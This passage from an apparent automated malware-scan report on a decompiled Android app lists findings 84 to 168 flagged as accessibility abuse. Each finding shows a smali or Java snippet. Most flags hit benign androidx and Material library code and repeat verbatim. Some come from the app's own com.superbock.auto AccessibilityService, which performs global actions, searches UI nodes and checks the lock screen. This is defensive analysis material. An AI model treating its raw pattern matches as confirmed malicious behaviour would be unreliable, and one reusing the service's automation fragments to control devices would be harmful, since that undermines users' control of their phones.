- **Line:** 81

```java
.method public final onPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**85. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate.smali`
- **Line:** 68

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**86. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate.smali`
- **Line:** 68

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**87. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate.smali`
- **Line:** 71

```java
    .locals 1

    invoke-super {p0, p1, p2}, Landroidx/core/view/AccessibilityDelegateCompat;->onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V

    instance-of v0, p1, Landroidx/recyclerview/widget/RecyclerView;
```

**88. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/drawerlayout/widget/DrawerLayout$AccessibilityDelegate.smali`
- **Line:** 140

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 2

```

**89. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/drawerlayout/widget/DrawerLayout$AccessibilityDelegate.smali`
- **Line:** 140

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 2

```

**90. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes12/androidx/drawerlayout/widget/DrawerLayout$AccessibilityDelegate.smali`
- **Line:** 143

```java
    .locals 2

    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0
```

**91. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/recyclerview/widget/RecyclerView$LayoutManager.smali`
- **Line:** 3125

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**92. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/recyclerview/widget/RecyclerView$LayoutManager.smali`
- **Line:** 3125

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**93. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/recyclerview/widget/RecyclerView$LayoutManager.smali`
- **Line:** 3127

```java
.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**94. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/core/view/ViewGroupCompat.smali`
- **Line:** 71

```java
.end method

.method public static onRequestSendAccessibilityEvent(Landroid/view/ViewGroup;Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0
    .annotation runtime Ljava/lang/Deprecated;
```

**95. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/core/view/ViewGroupCompat.smali`
- **Line:** 71

```java
.end method

.method public static onRequestSendAccessibilityEvent(Landroid/view/ViewGroup;Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0
    .annotation runtime Ljava/lang/Deprecated;
```

**96. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes13/androidx/core/view/ViewGroupCompat.smali`
- **Line:** 76

```java
    .end annotation

    invoke-virtual {p0, p1, p2}, Landroid/view/ViewGroup;->onRequestSendAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p0
```

**97. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 472

```java
    move-result-object v0

    invoke-virtual {v0, v13}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**98. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 472

```java
    move-result-object v0

    invoke-virtual {v0, v13}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**99. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 481

```java
    move-result-object v0

    invoke-virtual {v0, v14}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**100. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 472

```java
    move-result-object v0

    invoke-virtual {v0, v13}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**101. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 481

```java
    move-result-object v0

    invoke-virtual {v0, v14}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**102. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 490

```java
    move-result-object v0

    invoke-virtual {v0, v8}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7
```

**103. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/appcompat/widget/LinearLayoutCompat.smali`
- **Line:** 4512

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**104. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/appcompat/widget/LinearLayoutCompat.smali`
- **Line:** 4512

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**105. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/appcompat/widget/LinearLayoutCompat.smali`
- **Line:** 4515

```java
    .locals 1

    invoke-super {p0, p1}, Landroid/view/View;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    const-string v0, "androidx.appcompat.widget.LinearLayoutCompat"
```

**106. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/viewpager/widget/ViewPager$MyAccessibilityDelegate.smali`
- **Line:** 59

```java

# virtual methods
.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**107. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/viewpager/widget/ViewPager$MyAccessibilityDelegate.smali`
- **Line:** 59

```java

# virtual methods
.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**108. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/viewpager/widget/ViewPager$MyAccessibilityDelegate.smali`
- **Line:** 62

```java
    .locals 1

    invoke-super {p0, p1, p2}, Landroidx/core/view/AccessibilityDelegateCompat;->onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V

    const-class p1, Landroidx/viewpager/widget/ViewPager;
```

**109. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/core/view/ViewCompat.smali`
- **Line:** 3037

```java
    if-ne p1, v3, :cond_3

    invoke-static {}, Landroid/view/accessibility/AccessibilityEvent;->obtain()Landroid/view/accessibility/AccessibilityEvent;

    move-result-object v1
```

**110. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/core/view/ViewCompat.smali`
- **Line:** 3037

```java
    if-ne p1, v3, :cond_3

    invoke-static {}, Landroid/view/accessibility/AccessibilityEvent;->obtain()Landroid/view/accessibility/AccessibilityEvent;

    move-result-object v1
```

**111. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes14/androidx/core/view/ViewCompat.smali`
- **Line:** 3041

```java
    move-result-object v1

    invoke-virtual {p0, v1}, Landroid/view/View;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-virtual {v1, v3}, Landroid/view/accessibility/AccessibilityEvent;->setEventType(I)V
```

**112. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/appcompat/widget/SwitchCompat.smali`
- **Line:** 2086

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**113. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/appcompat/widget/SwitchCompat.smali`
- **Line:** 2086

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**114. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/appcompat/widget/SwitchCompat.smali`
- **Line:** 2089

```java
    .locals 1

    invoke-super {p0, p1}, Landroid/view/View;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    const-string v0, "android.widget.Switch"
```

**115. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/viewpager/widget/ViewPager.smali`
- **Line:** 3457

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 6

```

**116. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/viewpager/widget/ViewPager.smali`
- **Line:** 3457

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 6

```

**117. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes22/androidx/viewpager/widget/ViewPager.smali`
- **Line:** 3460

```java
    .locals 6

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0
```

**118. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes25/androidx/viewpager2/widget/ViewPager2$RecyclerViewImpl.smali`
- **Line:** 71

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**119. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes25/androidx/viewpager2/widget/ViewPager2$RecyclerViewImpl.smali`
- **Line:** 71

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**120. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes25/androidx/viewpager2/widget/ViewPager2$RecyclerViewImpl.smali`
- **Line:** 73

```java
.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**121. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes25/androidx/core/view/ViewCompat$Api19Impl.smali`
- **Line:** 109

```java
.end method

.method public static setContentChangeTypes(Landroid/view/accessibility/AccessibilityEvent;I)V
    .locals 0
    .annotation build Landroidx/annotation/DoNotInline;
```

**122. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes25/androidx/core/view/ViewCompat$Api19Impl.smali`
- **Line:** 114

```java
    .end annotation

    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityEvent;->setContentChangeTypes(I)V

    return-void
```

**123. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes3/androidx/viewpager2/widget/ViewPager2$AccessibilityProvider.smali`
- **Line:** 191

```java
.end method

.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**124. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes3/androidx/viewpager2/widget/ViewPager2$AccessibilityProvider.smali`
- **Line:** 191

```java
.end method

.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**125. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes3/androidx/viewpager2/widget/ViewPager2$AccessibilityProvider.smali`
- **Line:** 193

```java
.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**126. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/appcompat/widget/ScrollingTabContainerView$TabView.smali`
- **Line:** 111

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**127. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/appcompat/widget/ScrollingTabContainerView$TabView.smali`
- **Line:** 111

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**128. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/appcompat/widget/ScrollingTabContainerView$TabView.smali`
- **Line:** 114

```java
    .locals 1

    invoke-super {p0, p1}, Landroid/view/View;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    const-string v0, "androidx.appcompat.app.ActionBar$Tab"
```

**129. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/widget/NestedScrollView$AccessibilityDelegate.smali`
- **Line:** 27

```java

# virtual methods
.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**130. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/widget/NestedScrollView$AccessibilityDelegate.smali`
- **Line:** 27

```java

# virtual methods
.method public onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**131. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/widget/NestedScrollView$AccessibilityDelegate.smali`
- **Line:** 30

```java
    .locals 1

    invoke-super {p0, p1, p2}, Landroidx/core/view/AccessibilityDelegateCompat;->onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V

    check-cast p1, Landroidx/core/widget/NestedScrollView;
```

**132. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/view/ViewParentCompat.smali`
- **Line:** 740

```java
.end method

.method public static requestSendAccessibilityEvent(Landroid/view/ViewParent;Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0
    .annotation runtime Ljava/lang/Deprecated;
```

**133. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/view/ViewParentCompat.smali`
- **Line:** 740

```java
.end method

.method public static requestSendAccessibilityEvent(Landroid/view/ViewParent;Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0
    .annotation runtime Ljava/lang/Deprecated;
```

**134. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes4/androidx/core/view/ViewParentCompat.smali`
- **Line:** 745

```java
    .end annotation

    invoke-interface {p0, p1, p2}, Landroid/view/ViewParent;->requestSendAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p0
```

**135. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes5/androidx/core/view/accessibility/AccessibilityNodeProviderCompat$AccessibilityNodeProviderApi16.smali`
- **Line:** 60

```java
.end method

.method public findAccessibilityNodeInfosByText(Ljava/lang/String;I)Ljava/util/List;
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
```

**136. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes5/androidx/core/view/accessibility/AccessibilityNodeProviderCompat$AccessibilityNodeProviderApi16.smali`
- **Line:** 75

```java
    iget-object v0, p0, Landroidx/core/view/accessibility/AccessibilityNodeProviderCompat$AccessibilityNodeProviderApi16;->mCompat:Landroidx/core/view/accessibility/AccessibilityNodeProviderCompat;

    invoke-virtual {v0, p1, p2}, Landroidx/core/view/accessibility/AccessibilityNodeProviderCompat;->findAccessibilityNodeInfosByText(Ljava/lang/String;I)Ljava/util/List;

    move-result-object p1
```

**137. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/i/g.smali`
- **Line:** 1384

```java
.end method

.method public static G(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 3

```

**138. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/i/g.smali`
- **Line:** 1417

```java
    invoke-direct {p0}, Lf/e;-><init>()V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1
```

**139. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/i/g.smali`
- **Line:** 1484

```java

    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1
```

**140. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes2/i/g.smali`
- **Line:** 2224

```java

    :cond_0
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0
```

**141. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes2/i/g.smali`
- **Line:** 2452

```java

    :cond_0
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0
```

**142. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/com/google/android/material/textfield/TextInputLayout.smali`
- **Line:** 8335

```java
    const/16 p1, 0x800

    invoke-virtual {p0, p1}, Landroid/view/View;->sendAccessibilityEvent(I)V

    :cond_0
```

**143. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/com/google/android/material/button/MaterialButton.smali`
- **Line:** 1604

```java
.end method

.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**144. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/com/google/android/material/button/MaterialButton.smali`
- **Line:** 1604

```java
.end method

.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**145. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes2/com/google/android/material/button/MaterialButton.smali`
- **Line:** 1606

```java
.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**146. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali/com/superbock/auto/ScreenService.smali`
- **Line:** 347

```java
    move-result-object v2

    invoke-virtual {v2, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**147. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali/com/superbock/auto/ScreenService.smali`
- **Line:** 347

```java
    move-result-object v2

    invoke-virtual {v2, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**148. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali/com/superbock/auto/ScreenService.smali`
- **Line:** 347

```java
    move-result-object v2

    invoke-virtual {v2, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**149. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 2

```java
.class public Lcom/superbock/auto/BaseService;
.super Landroid/accessibilityservice/AccessibilityService;


```

**150. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 2

```java
.class public Lcom/superbock/auto/BaseService;
.super Landroid/accessibilityservice/AccessibilityService;


```

**151. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 242

```java
    .locals 0

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
```

**152. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 161

```java
.field public g:Ljava/lang/String;

.field public h:Landroid/view/accessibility/AccessibilityEvent;

.field public i:I
```

**153. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 421

```java
    const/4 v1, 0x0

    invoke-static {v0, v1}, Li/g;->G(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0
```

**154. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 690

```java
    const/4 v1, 0x0

    invoke-static {v0, v1}, Li/g;->G(Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0
```

**155. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 753

```java
    if-lez v9, :cond_2

    invoke-virtual {v1, v6}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    sput-wide v4, Lcom/superbock/auto/BaseService;->E:J
```

**156. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 857

```java
    :catch_1
    :goto_1
    invoke-virtual {v1, v15}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_15
```

**157. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 1031

```java
    sput-wide v4, Lcom/superbock/auto/BaseService;->E:J

    invoke-virtual {v1, v15}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    sget-boolean v0, Lcom/superbock/auto/BaseService;->o0:Z
```

**158. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 946

```java
    move-result-object v11

    invoke-virtual {v2, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2
```

**159. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 994

```java
    move-result-object v4

    invoke-virtual {v11, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4
```

**160. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali/com/superbock/auto/BaseService.smali`
- **Line:** 2752

```java
    iget-object v2, v0, Lcom/superbock/auto/BaseService;->n:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1
```

**161. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/c.java`
- **Line:** 22

```java
        try {
            if (motionEvent.getX() <= 0.0f || motionEvent.getY() <= 0.0f) {
                BaseService.f1402s.removeView(BaseService.f1407x);
                this.f2789b.performGlobalAction(1);
            } else if (motionEvent.getAction() == 1) {
                BaseService.f1402s.removeView(BaseService.f1407x);
                this.f2789b.performGlobalAction(1);
```

**162. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/c.java`
- **Line:** 25

```java
                this.f2789b.performGlobalAction(1);
            } else if (motionEvent.getAction() == 1) {
                BaseService.f1402s.removeView(BaseService.f1407x);
                this.f2789b.performGlobalAction(1);
                this.f2789b.j();
            }
            return false;
```

**163. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/i.java`
- **Line:** 3

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
```

**164. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityService
- **File:** `sources/f3/i.java`
- **Line:** 3

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
```

**165. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/i.java`
- **Line:** 4

```java
package f3;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.ClipData;
```

**166. Accessibility Abuse**
- **Description:** Pattern detected: AccessibilityService
- **File:** `sources/f3/i.java`
- **Line:** 197

```java

        /* renamed from: f3.i$a$a, reason: collision with other inner class name */
        /* loaded from: classes20.dex */
        public class C0033a extends AccessibilityService.GestureResultCallback {

            /* renamed from: a, reason: collision with root package name */
            public final /* synthetic */ GestureDescription.StrokeDescription f2822a;
```

**167. Accessibility Abuse**
- **Description:** Pattern detected: accessibilityservice
- **File:** `sources/f3/i.java`
- **Line:** 206

```java
                this.f2822a = strokeDescription;
            }

            @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
            public final void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
            }
```

**168. Accessibility Abuse**
- **Description:** Pattern detected: performGlobalAction
- **File:** `sources/f3/i.java`
- **Line:** 809

```java
                } catch (InterruptedException unused) {
                }
                if (!keyguardManager.isKeyguardSecure()) {
                    BaseService.g().performGlobalAction(3);
                    return;
                }
